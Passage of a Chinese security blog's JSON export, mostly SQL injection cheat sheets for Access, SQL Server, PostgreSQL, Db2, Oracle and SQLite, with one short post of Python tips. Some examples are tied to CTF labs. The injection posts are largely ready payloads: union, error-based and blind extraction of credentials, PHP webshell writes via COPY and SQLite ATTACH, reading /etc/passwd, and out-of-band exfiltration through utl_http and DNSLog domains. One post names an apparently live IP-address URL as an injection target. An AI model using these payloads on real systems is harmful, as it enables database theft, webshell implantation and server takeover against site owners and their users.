http://117.167.136.245:10181/shownews.asp此时页面并不会正常回显，这个时候再抓包 在cookie后面加一个;id=170，发包后，发现页面回显正常了。上述操作就是利用了cookie来传参数，而不用GET型在URL中传参数。需要注意的是：在cookie中添加的id就是之前URL中的那个id，但是只有某些网站能够允许通过cookie传参才能利用。后面就是正常的注入过程了，不过注意空格用+代替。 Modify Header插件的使用这个插件可以直接在插件里修改cookie然后刷新网页即可。首先，网页还是回到删掉了?id=170的页面，然后打开这个插件。 在Name那里填入Cookie,Value那里填入值，我这里已经知道字段数为10了，直接union查询，不过这里的是Access数据库，后面需要跟上from admin，当然，admin这个表需要盲猜出来。还得注意要用+代替空格。填好后，直接刷新网页： 可以发现回显了2,3,7,8,9. 之后正常注入即可。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"修改cookie参数进行SQL注入","slug":"修改cookie参数进行SQL注入","permalink":"https://ggyggy666.github.io/tags/%E4%BF%AE%E6%94%B9cookie%E5%8F%82%E6%95%B0%E8%BF%9B%E8%A1%8CSQL%E6%B3%A8%E5%85%A5/"}],"keywords":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"python小知识","slug":"python小知识","date":"2020-04-06T14:18:00.000Z","updated":"2020-04-06T14:48:45.369Z","comments":true,"path":"2020/04/06/python小知识/","link":"","permalink":"https://ggyggy666.github.io/2020/04/06/python%E5%B0%8F%E7%9F%A5%E8%AF%86/","excerpt":"今天写了个ASCII码与字符相互转换的小工具，挺多小知识都忘了还得百度，因此在此记录下来，以备将来之用。","text":"今天写了个ASCII码与字符相互转换的小工具，挺多小知识都忘了还得百度，因此在此记录下来，以备将来之用。 字符串转列表 有一个字符串：ch=”a b c d”，想要把它转为列表，就可以逐个访问。 ch.split(&#39; &#39;)使用split根据空格切割，返回一个列表。 有一个字符串：ch=”abcd”，转为列表。list1=list(ch)直接使用list将它强制转为列表类型。往列表添加字符list1.append(i)列表越界问题如果要通过下标访问列表或向列表添加字符，需要考虑该列表是否已经有足够的空间，因为一般都是先定义：list1 = [] 而已，此时通过下标访问是会越界的。 两个列表可以合并成一个字典dict1 = dict(zip(list1,list2))list1的值为键，list2的值为value。 字典通过键找到对应的值直接像数组一样访问。比如字典dict1中，键是：a, 值是：hb.那么可以通过：dict1[a]得到hb。 字典通过值找到对应的键不用网上的方法，可以使用循环： for k, v in dict1.items(): if v == &apos;a&apos;: print(k)items()可以返回字典所有的键(k遍历）和所有的值（v遍历）。如果已知的值跟字典中某个值v对应，就可以直接返回相应的键k。 获取字典所有的键并遍历for k in dict1.keys():获取字典所有的值并遍历for v in dict1.values():文件操作打开文件with open(&apos;文件路径&apos;,&apos;r&apos;) as f: f.read() 或 f.readline() 或 f.readlines()r是只读，可以是w,a，也可以后面加一个+。f.read()将内容一次读入。f.readline()只能读一行。f.readlines()读取所有行，然后可以：for line in f.readlines():进行遍历。 多线程先导入库。import threading 不带参数t = threading.Thread(target=Help())注意需要函数名以及()，跟直接使用Help()是一样的，没有t.start()。 带参数t = threading.Thread(target=Help, args=(a,)) t.start()注意只有函数名，没有()，必须使用t.start(),这才是真正的多线程。args=(a,)只传了一个参数，但是后面会跟一个逗号（不知为何）. 退出先导入库, 再直接执行退出程序。 import sys sys.exit(0)","categories":[{"name":"python工具","slug":"python工具","permalink":"https://ggyggy666.github.io/categories/python%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"python小知识","slug":"python小知识","permalink":"https://ggyggy666.github.io/tags/python%E5%B0%8F%E7%9F%A5%E8%AF%86/"}],"keywords":[{"name":"python工具","slug":"python工具","permalink":"https://ggyggy666.github.io/categories/python%E5%B7%A5%E5%85%B7/"}]},{"title":"不同数据库的注入方法(Postgre、Db2)","slug":"不同数据库的注入方法-Postgre、Db2","date":"2020-04-05T02:44:24.000Z","updated":"2020-04-05T15:14:37.044Z","comments":true,"path":"2020/04/05/不同数据库的注入方法-Postgre、Db2/","link":"","permalink":"https://ggyggy666.github.io/2020/04/05/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-Postgre%E3%80%81Db2/","excerpt":"今天学习Postgre和Db2的注入方法。","text":"今天学习Postgre和Db2的注入方法。 Postgre数据库PostgreSQL默认端口是5432，默认用户名和数据库名都是：postgres，注释符：–, 延时函数：pg_sleep(3)，也有information_schema表。条件判断不是if，而是： select casr when(current_user=&apos;postgres&apos;) then pg_sleep(5) else pg_sleep(0) end;查看当前用户权限select CURRENT_SCHEMA()查看用户select user select usename from pg_user select getpgusername()查看当前用户select current_user select session_user and 1=cast(current_user || 999 as int)cast是转换类型函数。 查看版本信息select version()查看当前数据库select current_database() select datname from pg_database limit 1 offset 0查看安装目录union SELECT NULL,setting,NULL FROM pg_settings WHERE name=&apos;data_directory&apos;将ASCII码转为字符串select chr(37)||chr(100)...union联合注入爆字段数同样是order by,然后 union select null,null…注意需要判断字段类型。 爆当前数据库名union select 1,null,current_database() limit 1 offset 0 union select 1,null,datname from pg_database limit 1 offset 0 union select 1,null,datname from pg_stat_database limit 1 offset 0使用limit 1 offset 1这样遍历。 爆当前数据库中有管理员权限的用户union select null,usename,null,null FROM pg_user WHERE usesuper IS TRUE limit 1 offset 0爆表名爆当前库的表名union select 1,null,tablename from pg_tables where schemaname=&apos;public&apos; limit 1 offset 0就是使用public，而不是用上面爆的数据库名。 爆所有用户的表名union select 1,null,relname from pg_stat_user_tables limit 1 offset 0爆普通表名union select 1,null,relname from pg_class where relkind=&apos;r&apos; limit 1 offset 0爆表名的oid值union select 1,null oid from pg_class where relname=&apos;表名&apos; limit 1 offset 0爆出表名的oid值后，需要转换成字符型： union select 1,null cast(oid as varchar(10)） from pg_class where relname=&apos;表名&apos; limit 1 offset 0爆列名与MySQL类似的information_schemaunion select 1,null,column_name from information_schema.columns where table_name=&apos;表名&apos; limit 1 offset 0使用表名的oid值union select 1,null,attname from pg_attribute where attrelid=表名的oid值 limit 1 offset 0爆字段内容爆当前数据库的表的内容union select 1,null,name||password from usersusers是表名。 直接从pg_shadow爆数据库用户信息union select 1,null,username||chr(124)||passwd||usesuper fom pg_shadow limit 1 offset 0报错注入and 1=cast((chr(113)||chr(98)||chr(122)||chr(98)||chr(113))||(select coalesce(schemaname as character(10000)),(chr(32))) from pg_tables offset 0 limit 1)::text||(chr(113)||chr(112)||chr(106)||chr(98)||chr(113)) as numeric()布尔盲注and ascii(substring((select coalesce(cast(count(distinct(schemaname)) as character(10000)),(chr(32))) from pg_tables)::text from 1 for 1))&gt;48猜当前数据库名长度and (select length(current_database())) between 1 and 10当然，&gt;&lt;也是可以的。 猜库名and (select ascii(substr(current_database(),1,1)))&gt;1同样可以修改猜第二个，第三个… 猜库中的表的个数and (select count(*) from pg_stat_user_tables)&gt;8猜表名长度and (select length(relname) from pg_stat_user_tables limit 1 offset 0)&gt;4猜表名and (select ascii(substr(relname,1,1)) from pg_stat_user_tables limit 1 offset 0)&gt;20才列名个数and (select count(*) from information_schema.columns where table_name=&apos;reg_users&apos;)&gt;4猜列名长度and (select length(column_name) from information_schema.columns where table_name=&apos;表名&apos; limit 1 offset 0)&gt;4猜列名and (select ascii(substr(column_name,1,1)) from information_schema.columns where table_name=&apos;表名&apos; limit 1 offset 0)&gt;4猜字段内容长度and (select length(name) from reg_users limit 1 offset 0)&gt;4name是列名，reg_users是表名。 猜字段内容and (select ascii(substr(name,1,1)) from 表名 limit 1 offset 0)&gt;20时间盲注and select case when (coalesce(ascii(substr((select current_user),1,1)),0)&gt;100) then pg_sleep(5) else pg_sleep(0) end limit 1写文件create table test(shell text not null); insert into test values(&apos;&lt;?php eval($POST[cmd];?&gt;&apos;) copy test(shell) to &apos;/var/www/html/xxx.php&apos;直接一句话： copy(select &apos;&lt;?php eval($_POST[cmd];?&gt;&apos;) to &apos;/var/www/html/xxx.php&apos;读文件create table test1(file text not null); copy test1(file) from &apos;/etc/passwd&apos;; select * from test1或者： select pg_read_file(路径)更多文件操作函数看：http://blog.sina.com.cn/s/blog_b34174010101gt25.html 参考文章：https://www.cnblogs.com/KevinGeorge/p/8446874.htmlhttps://blog.csdn.net/p656456564545/article/details/42466633https://www.bbsmax.com/A/n2d9gmOQJD/https://blog.csdn.net/qq_36119192/article/details/104628797 Db2数据库爆数据库版本select service_level from table(sysproc.env_get_inst_info()) as instanceinfo select versionnurober,version_timestamp from sysibm.sysversions（这句未成功）爆当前用户select user from sysibm.sysdummy1 select session_user from sysibm.sysdummy1 select system_user from sysibm.sysdummy1爆当前用户的权限select * from syscat.tabauthwhere grantee=current_user获取数据库权限select * from syscat.tabauth爆数据库的管理员账户select distinct(grantee) from sysibm.systabauth where controlauth=&apos;Y&apos;未成功 爆数据库所在主机相关信息select * from sysibmadm.env_sys_info爆当前数据库select current schema from sysibm.sysdummy1GAMETASK 爆当前数据库的表select table_name from sysibm.tables select name from sysibm.systablesADMINTABCOMPRESSINFO select current server from sysibm.sysdummy1这条不知道是啥。可能是其它数据库的表？ 返回所有用户创建的表名select name from sysibm.systables where creator=user返回第一条记录select name from sysibm.systables where creator=user fetch first 1 rows onlyGAME_CHARACTER返回第一条记录，类似top 1 爆当前数据库的列名select name,tbname,coltype from sysibm.syscolumns select colname from syscat.columns where name=&apos;table_name&apos;（未成功） select name from sysibm.syscolumns where tbcreator=&apos;&apos; and tbname=&apos;&apos;ACCESSCTRLAUTH union联合注入爆字段数同样是order by，然后union select 1,2,3… from syscat.tables看返回那个字段。注意，必须要跟一个存在的表。 爆当前数据库union select 1,2,current schema,4 from sysibm.sysdummy1爆表名union select 1,2,name,4 from sysibm.systables where creator=user fetch first 1 rows only union select 1,2,tabname,4 from syscat.tables where tabschema=current schema limit 0,1爆列名union select 1,2,column_name,4 from sysibm.columns where table_schema=current schema and table_name=&apos;GAME_CHARACTER&apos; limit 0,1通过limit 1,1爆其它列。 爆字段数据union select 1,NAME,PASSWORD,4 from GAME_CHARACTER limit 1,1盲注猜用户名字长度and (select length(rtrim(user)) from sysibm.sysdummy1)&gt;4猜用户名and (select ascii(substr(rtrim(user),1,1)) from sysibm.sysdummy1)&gt;99爆当前数据库名长度and (select length(rtrim(current schema)) from sysibm.sysdummy1)&gt;6爆当前数据库名and (select ascii(substr(rtrim(current schema),1,1)) from sysibm.sysdummy1)&gt;99猜用户表的数量and (select count(name) from sysibm.systables where creator=user)&gt;0或者： and (select count(name) from syscat.tables where tabschema=current schema limit 0,1)&gt;0猜表的长度and (select length(name) from sysibm.systables where creator=user fetch first 1 rows only)&gt;0 and (select length(name) from sysibm.systables where creator=user and name not in(&apos;爆出的第一个表名&apos;) fetch first 1 rows only)&gt;0或者： and (select length(name) from syscat.tables where tabschema=current schema limit 0,1)&gt;0猜表名and (select ascii(substr(name,1,1)) from sysibm.systables where creator=user fetch first 1 rows only)&gt;0 and (select ascii(substr(name,1,1)) from sysibm.systables where creator=user and name not in(&apos;爆出的第一个表名&apos;) fetch first 1 rows only)&gt;0或者： and (select ascii(substr(name,1,1)) from syscat.tables where tabschema=current schema limit 0,1)&gt;0通过limit 1,1爆其它表名。 猜列名数量and (select count(column_name) from sysibm.columns where table_schema=current schema and table_name=&apos;GAME_CHARACTER&apos; limit 0,1)&gt;0猜列名长度and (select length(column_name) from sysibm.columns where table_schema=current schema and table_name=&apos;GAME_CHARACTER&apos; limit 0,1)&gt;0 and (select length(column_name) from sysibm.columns where table_schema=current schema and table_name=&apos;GAME_CHARACTER&apos; limit 1,1)&gt;0猜列名and (select ascii(substr(column_name,1,1)) from sysibm.columns where table_schema=current schema and table_name=&apos;GAME_CHARACTER&apos; limit 0,1)&gt;0 and (select ascii(substr(column_name,1,1)) from sysibm.columns where table_schema=current schema and table_name=&apos;GAME_CHARACTER&apos; limit 1,1)&gt;0猜字段内容长度and (select length(PASSWORD) from 表名 limit 0,1)&gt;0猜字段内容and (select ascii(substr(PASSWORD,1,1)) from 表名 limit 0,1)&gt;0 and (select ascii(substr(PASSWORD,1,1)) from 表名 limit 0,1)&gt;0参考文章：https://www.csdn.net/gather_2a/MtTaAg5sNzMyMC1ibG9n.htmlhttp://www.520ve.com/2315.html","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"不同数据库的注入方法(Postgre、Db2)","slug":"不同数据库的注入方法-Postgre、Db2","permalink":"https://ggyggy666.github.io/tags/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-Postgre%E3%80%81Db2/"}],"keywords":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"不同数据库的注入方法(Oracle、Sqlite)","slug":"不同数据库的注入方法-Oracle、Sqlite","date":"2020-04-02T14:32:04.000Z","updated":"2020-04-04T14:20:08.502Z","comments":true,"path":"2020/04/02/不同数据库的注入方法-Oracle、Sqlite/","link":"","permalink":"https://ggyggy666.github.io/2020/04/02/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-Oracle%E3%80%81Sqlite/","excerpt":"今天总结一下Oracle、Sqlite的注入方法。","text":"今天总结一下Oracle、Sqlite的注入方法。 Oracle数据库题目地址：https://www.mozhe.cn/bug/detail/M2dRRXJqN3RqWnhvTGRTK1JJdjk5dz09bW96aGUmozhe 注意：Oracle查询最后的字段数据时如果表名列名啥的是小写的，用的是双引号不是单引号！ 系统表dual、user_tables。dual是Oracle的虚拟表，必定存在。而使用union猜字段数时必须得有表名，因此可以：union select xxx from dual。 爆当前用户select sys_context(&apos;userenv&apos;,&apos;current_user&apos;)from dual where rownum=1 爆所有用户select username from all_users order by username爆数据库名select distinct owner from all_tables where rownum=1all_tables是所有的表，all_tab_columns是所有的列。 爆操作系统版本select member from v$logfile where rownum=1定位DB文件select name from V$DATAFILE where rownum=1上面这些都是直接替换某个字段。用联合注入。 union联合查询爆字段order by 4 判断字段类型union select null,null,null,null from dual先用null代替，然后判断每个字段的类型，如： union select 1,null,null,null from dual union select &apos;1&apos;,null,null,null from dual如果第一句回显正确，第二句回显错误，那么就是数字型，反之是字符型。就这样一个字段一个字段判断下去，直至判断完所有字段或者有回显的数字了。注意，除了数字型和字符型还有其他类型的，因此用1,’1’,判断时都会报错，用null就行了。 爆数据库版本信息union select 1,(select banner from sys.v_$version where rownum=1),3,4 from dual爆数据库名union select &apos;1&apos;,(select instance_name from v$instance) from dual爆表名union select 1,(select table_name from user_tables where rownum=1),3,4 from dual union select 1,(select table_name from user_tables where rownum=1 and table_name not in(&apos;第一句爆出的表名&apos;)),3,4 from dual这道题表太多了…爆好久才行，因此需要使用Like。 union select &apos;1&apos;,(select table_name from user_tables where rownum=1 and table_name like &apos;%user%&apos;) from dual爆列名union select 1,(select column_name from user_tab_columns where rownum=1 and table_name=&apos;表名&apos;),3,4 from dual union select 1,(select column_name from user_tab_columns where rownum=1 and table_name=&apos;表名&apos; and column_name not in(&apos;第一个列名&apos;)),3,4 from dual爆字段内容union select 1,列名1 || 列名2 ||列名3...，3,4 from 表名 where rownum=1使用||可以连接多个字段，concat只能练两个。 通过列名找到对应表select owner,table_name from all_tab_solumns where column_name like &apos;%username%&apos;username就是列名。 查询第N行内容select username from(select rownum r,username from all_users order by username)where r=9报错注入utl_inaddr.get_host_name函数and 1=utl_inaddr_get_host_name((select user from dual))ctxsys.dirthsx.sn()函数and 1=ctxsys.dirthsx.sn(1,(select user from dual))XMLType()函数and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not nulldbms_xdb_version.chekin()函数and (select dbms_xdb_version.chekin((select user from dual)) from dual) is not nulldbms_xdb_version.makeversioned、dbms_xdb_version.uncheckout、dbms_utility.sqlid_to_sqlhash跟这个一样，替换函数名即可。 ordsys.ord_dicom.getmappingxpath()函数and 1=ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user)decode函数and 1=(select decode(substr(user,1,1),&apos;S&apos;,(1/0),0) from dual)decode在这里不会回显报错，偏向于布尔型。 带外通信http请求和DNS查询，转发到服务器就能看到。实则就相当于DNSLog。 utl_http.request()函数and 1=utl_http.request(&apos;http://192.168.2.111:80&apos;||(select banner from sys.v_$version where rownum=1))该函数向指定主机发起http请求，携带了查询结果。 utl_inaddr.get_host_address()函数and (select utl_inaddr.get_host_address((select user from dual)||&apos;xxx.ceye.io&apos; from dual) is not nullDNS记录，将查询结果拼接到域名然后查询。就是DNSLog注入。 布尔盲注decode()函数and 1=(select decode(substr(user,1,1),&apos;S&apos;,(1),0) from dual)instr()函数and 1=(instr((select user from dual),&apos;SQL&apos;))instr可以查询SQL在查出的结果中的位置并返回该位置。类似regexp。 时间盲注DBMS_PIPE.RECEIVE_MESSAGE()函数and 1=(DBMS_PIPE.RECEIVE_MESSAGE(&apos;a&apos;,10)) AND 7238=(CASE WHEN (ASCII(SUBSTRC((SELECT NVL(CAST(USER AS VARCHAR(4000)),CHR(32)) FROM DUAL),3,1))&gt;96) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(71)||CHR(106)||CHR(72)||CHR(73),1) ELSE 7238 END) AND &apos;1&apos;=&apos;1&amp;sname=1 decode()函数and 1=(select decode(substr(user,1,1),&apos;A&apos;,DBMS_PIPE.RECEIVE_MESSAGE(&apos;RDS&apos;,5) ,0) from dual)decode与DBMS_PIPE.RECEIVE_MESSAGE嵌套and 1=(select decode(substr(user,1,1),&apos;A&apos;,DBMS_PIPE.RECEIVE_MESSAGE(&apos;RDS&apos;,5) ,0) from dual) Sqlite数据库CTF题目地址：https://www.mozhe.cn/bug/detail/UzRPT0FZSTZDeWVid2duMVcyV055dz09bW96aGUmozhe Sqlite是一个轻量级的数据库，它的数据类型就是无类型。它没有系统库，只有表，表名叫sqlite_master。不存在mysql中ord,ascii等，sqlite中应该使用char与hex。 select * from sqlite_master where type=char(0x74,0x61,0x62,0x6c,0x65)union查询判断字段数同样order by, 再用union select 1,2,3…判断哪个字段可以回显。 爆数据库版本信息union select 1,2,sqlite_version()爆表名union select 1,2,group_concat(tbl_name) from sqlite_master where type=&apos;table&apos;爆创建表的SQL语句，得到表结构union select 1,2,sql from sqlite_master where type=&apos;table&apos; and tbl_name=&apos;users&apos;表名是users，爆创建它的sql语句，从而知道所有列名。 爆字段数据union select 1,2,group_concat(name,password) from users limit 1盲注爆版本长度and length(sqlite_version())=6爆第一位and substr(sqlite_version(),1,1)=&apos;3&apos;不能用ascii。第二、第三…同理。 爆表名长度and (select length(name) from sqlite_master where type=&apos;table&apos; limit 0,1)=5爆表名and substr((select name from sqlite_master where type=&apos;table&apos; limit 0,1)1,1)=&apos;5&apos; and substr((select name from sqlite_master where type=&apos;table&apos; limit 0,1)2,1)=&apos;5&apos; ...爆出来的只是第一张表，可以通过limit 1,1…获取其它表。（实测没成功） Getshell?id=1;attach database&apos;C:\\\\Sqlite\\\\xxx.php&apos; as test;create table test.exp(dataz text);insert into test.exp(dataz) values (&apos;&lt;?php phpinfo();?&gt;&apos;);首先attach database其实就是创建一个文件，而Sqlite中数据库就是文件，因此这也是在创建一个数据库。别名为test。再创建表test.exp。表名就是exp，列名是dataz，类型是text文本类型。再往里插进一句话，最后访问到就用蚁剑链接即可。 参考文章：http://www.zhutougg.com/2017/02/26/ji-yu-sqliteshu-ju-ku-de-sqlzhu-ru/https://www.cnblogs.com/xiaozi/p/5760321.html","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"不同数据库的注入方法(Oracle、Sqlite)","slug":"不同数据库的注入方法-Oracle、Sqlite","permalink":"https://ggyggy666.github.io/tags/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-Oracle%E3%80%81Sqlite/"}],"keywords":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"不同数据库的注入方法(Access、SQLServer)","slug":"不同数据库的注入方法(Access、SQLServer)","date":"2020-04-01T09:12:21.000Z","updated":"2020-04-02T11:57:20.068Z","comments":true,"path":"2020/04/01/不同数据库的注入方法(Access、SQLServer)/","link":"","permalink":"https://ggyggy666.github.io/2020/04/01/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95(Access%E3%80%81SQLServer)/","excerpt":"之前的都是MySQL的注入方法，今天来讲一下其它数据库的注入方法。","text":"之前的都是MySQL的注入方法，今天来讲一下其它数据库的注入方法。 Access数据库CTF题目：https://www.mozhe.cn/bug/detail/VExmTm05OHhVM1dBeGdYdmhtbng5UT09bW96aGUmozhe这是微软的数据库，它只有一个数据库名！就是：msysobjects，在WEB环境下没有访问权限，而SQLServer就是：sysobjects，有访问权限。因此，当判断存在注入后： 判断数据库类型and (select count(*) from sysobjects)&gt;0 1 and (select count(*) from msysobjects)&gt;0 2先使用第一句，没有出错，肯定不是Access；再看第二句，出错了，就是SQL-Server。如果第一句和第二句都出错了，就是Access。Access只能使用盲猜表名和列名。 在确认存在注入后：可以使用union联合查询，适用于页面有回显。另一种就是使用exitst慢慢猜，适用于无回显且猜解正确或者错误时页面有变化。 union联合查询order by 确定列名order by 22 猜解表名union select 1,2,3,...,22 from 表名表名可以猜一下admin那些，后面给出可猜的。猜到了没有报错，并且回显了某个数字（比如3,12），那么就进行下一步。 猜解列名如果假设表名是admin，那么： union select 1,2,username,4,...,11,password,12,... from admin猜字段是username或者password。猜中了就直接爆出数据了。 exists逐字猜解猜解表名and exists(select * from 表名) and (select count(*) from 表名)&gt;0两个语句都可以。表名存在就回显正常。 猜解列名and exists(select 列名 from 表名) and (select count(列名) from 表名)&gt;0可以猜一下username,password。 猜解每个字段的长度and (select top 1 len(列名) from 表名)=5如果返回正常就是该列名的数据长度为5。top 1显示第一条数据。 猜解每个字段内容and (select top 1 asc(mid(列名,1,1))from 表名)=97 and (select top 1 asc(mid(列名,2,1))from 表名)=100 ...列名与表名可自行替换。可以使用burp爆破尝试一下。 常用表名与列名可见：https://github.com/ggyggy666/ggyggy666.github.io/blob/master/Access%E5%B8%B8%E7%94%A8%E7%88%86%E7%A0%B4%E8%A1%A8%E5%90%8D%E3%80%81%E5%88%97%E5%90%8D.txt 参考链接：https://blog.csdn.net/u011781521/java/article/details/53942183https://www.jianshu.com/p/c1ebccc72486?from=timeline SQL Server数据库CTF题目：https://www.mozhe.cn/bug/detail/SXlYMWZhSm15QzM1OGpyV21BR1p2QT09bW96aGUmozhe 数据库名SQLServer一般有4个数据库： master：最重要的数据库。包含用户登录信息，所在组，所有系统的配置选项，服务器中本地数据库的名称和信息、初始方式等。 model：创建数据库的模板。 msdb：提供SQL Server Agent（一个Windows服务，用来运作制定的任务计划）的工作信息。 tempdb：临时数据库。 术语名称 sys.databases: 所有数据库名。 information_schema.tables: 当前数据库中的表。 sys.database_files: 数据库数据文件。 @@servername: 运行SQLServer的本地服务器名称。 @@version: 安装版本、处理器体系结构、生成日期和操作系统。 连接运算符：’aaa’+’bbb’=’aaabbb’ cast(x as type): 将一个类型转换到另一个类型，如：cast(10 as char(3)) col_length(table,column): 返回表中某个字段的长度。 col_name(table_id,column_id): 返回表中某个字段的名称。 datalength(exp): 返回数据表达式的数据的实际长度。 db_name(id): 返回当前数据库的名称,里面的id可填可不填，代表第几个数据库。 host_name(): 返回服务器计算机的名称。 suser_sname(): 返回当前用户的登录名。 user_name(): 返回数据库用户名。 判断出是什么注入后，可以： 爆数据库版本?id=1 and 1=(select @@version)爆数据库名?id=1 and 1=(select db_name())这样爆出的是当前数据库名。 爆其它数据库名?id=1 and 1=(select top 1 name from master..sysdatabases)爆出来另一个数据库名，比如：master。 ?id=1 and 1=(select top 1 name from master..sysdatabases where name not in (&apos;master&apos;))通过not in排除已爆出的master，从而得到另一个数据库名：model。 ?id=1 and 1=(select top 1 name from master..sysdatabases where name not in (&apos;master&apos;,&apos;model&apos;))再爆出来，就往上加就行了，同理的。这种一次只能爆一个数据。 爆当前数据库下的数据（只能爆一个字段下）从上面已经知道了爆的当前数据库名，比如：test。 information_schema爆表名?id=1 and 1=(select top 1 table_name from test.information_schema.tables)爆出一个表test，继续： ?id=1 and 1=(select top 1 table_name from test.information_schema.tables where table_name not in(&apos;test&apos;)) 再爆另一张表… information_schema爆列名?id=1 and 1=(select top 1 column_name from test.information_schema.columns where table_name=&apos;test&apos;)从test表中爆字段id，同样not in： ?id=1 and 1=(select top 1 column_name from test.information_schema.columns where table_name=&apos;test&apos; and column_name not in(&apos;id&apos;))同理…最后有id,name,password字段。 爆字段数据?id=1 and (select top 1 unicode(substring(password,1,1)) from test)=50 ?id=1 and (select top 1 unicode(substring(password,2,1)) from test)=50跟其他盲注没区别，应该能用ascii,mid，慢慢爆吧…. having报错注入直接爆列名?id=1 having 1=1爆出来一个表名:test.id,test是数据库的表名，id就是其中一个列名， 然后使用group by语句： ?id=1 group by test.id having 1=1再爆出来一个表名：test.name。继续： ?id=1 group by test.id,test.name having 1=1这样继续爆下去即可。 union联合查询如果union select不行，可以试试union all select。对于这道CTF题目，注意字段3那里得是字符型才行,’3’。 爆字段数order by爆字段数，union select 1,2,xxx看哪个字段回显。 爆版本信息和服务器名称union select @@version,@@servername爆当前数据库和当前用户名union select db_name(),suser_sname()爆所有数据库名union all select 1,(select top 1 name from sys.databases where name not in(select top 0 name from sys.databases)),&apos;3&apos;,4 union all select 1,(select top 1 name from sys.databases where name not in(select top 1 name from sys.databases)),&apos;3&apos;,4通过修改后面的top 0来获取其它数据库名，或者： union all select 1,(select db_name(1)),&apos;3&apos;,4 union all select 1,(select db_name(2)),&apos;3&apos;,4可以通过修改db_name里面的值获取其它数据库名。那个3得是字符型的。 爆当前数据库中的所有表union all select 1,(select top 0 table_name from information_schema.tables where table_name not in(select top 0 table_name from information_schema.tables)),&apos;3&apos;,4 union all select 1,(select top 1 table_name from information_schema.tables where table_name not in(select top 1 table_name from information_schema.tables)),&apos;3&apos;,4可以通过修改后面的top 0获取其它表名。或者： union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype = &apos;U&apos;),&apos;3&apos;,4其中，mozhe_db_v2是一个数据库名。这样得到的是一个当前用户下的表。 爆某个表中的列名union all select 1,(select top 1 column_name from information_schema.columns where table_name=&apos;表名&apos; and column_name not in(select top 1 column_name from information_schema.columns where table_name=&apos;表名&apos;)),&apos;3&apos;,4 union all select 1,(select top 1 column_name from information_schema.columns where table_name=&apos;表名&apos; and column_name not in(select top 2 column_name from information_schema.columns where table_name=&apos;表名&apos;)),&apos;3&apos;,4可以通过修改最后面的top 1获取其它列名。not in后面的内容也可以是已经爆出来的内容，详见下面的布尔盲注。或者： union all select 1,(select top 1 col_name(object_id(&apos;manage&apos;),1) from sysobjects),&apos;3&apos;,4可以将object_id里面的1替换成2，3…来获取其它列名。 爆字段数据union all select 1,(select top 0 username from 表名 where username not in(select top 1 username from 表名)),&apos;3&apos;,4 union all select 1,(select top 1 username from 表名 where username not in(select top 2 username from 表名)),&apos;3&apos;,4其中，username是列名。可以通过修改后面的top 1获取其它数据。 报错注入利用类型转换报错。 爆版本信息and 1=(select 1/@@version)数字类型除字符类型，报错。 爆数据库名and 1=(select 1/(select top 1 name from sys.databases where name not in(select top 1 name from sys.databases))) and 1=(select 1/(select top 1 name from sys.databases where name not in(select top 2 name from sys.databases)))表名和列名可以按照上面union的其中的语句替换一下来爆。 布尔盲注爆某数据库名长度and len(db_name())&gt;10db_name(1),db_name(2)…根据id爆其它数据库名。 爆数据库名and ascii(substring((select db_name(1)),1,1))&gt;64 and ascii(substring((select db_name(1)),1,1))&gt;128常用的二分法判断，然后也可以修改1来爆其它位的数据。 爆表名长度and (select top 1 len(table_name) from mozhe_db_v2.information_schema.tables)&gt;5 and (select top 1 len(table_name) from mozhe_db_v2.information_schema.tables where table_name not in(&apos;manage&apos;))&gt;12爆表名and ascii(substring((select top 1 table_name from mozhe_db_v2.information_schema.tables),1,1))&gt;108 and ascii(substring((select top 1 table_name from mozhe_db_v2.information_schema.tables),2,1))&gt;108 ...这只是一张表，表名是（manage），爆其它表： and ascii(substring((select top 1 table_name from mozhe_db_v2.information_schema.tables where table_name not in(&apos;manage&apos;)),1,1))=1爆列名长度and (select top 1 len(column_name) from mozhe_db_v2.information_schema.columns where table_name=&apos;表名&apos;)&gt;5 and (select top 1 len(column_name) from mozhe_db_v2.information_schema.columns where table_name=&apos;表名&apos; and column_name not in(&apos;id&apos;))&gt;5爆列名and ascii(substring((select top 1 column_name from mozhe_db_v2.information_schema.columns where table_name=&apos;manage&apos;),1,1))&gt;108 and ascii(substring((select top 1 column_name from mozhe_db_v2.information_schema.columns where table_name=&apos;manage&apos; and column_name not in(&apos;id&apos;)),1,1))&gt;108爆某个字段的内容长度and (select top 1 len(username) from manage)&gt;7manage是表名。 爆某个字段内容and ascii(substring((select top 1 username from manage),1,1))&gt;100时间盲注?id=1;if(2&gt;1) waitfor delay &apos;0:0:5&apos; ?id=1;if(ascii(substring((select db_name(1)),1,1))&gt;64) waitfor delay 